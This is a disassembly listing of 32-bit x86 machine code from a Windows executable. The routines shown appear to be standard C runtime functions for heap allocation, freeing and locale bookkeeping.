  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
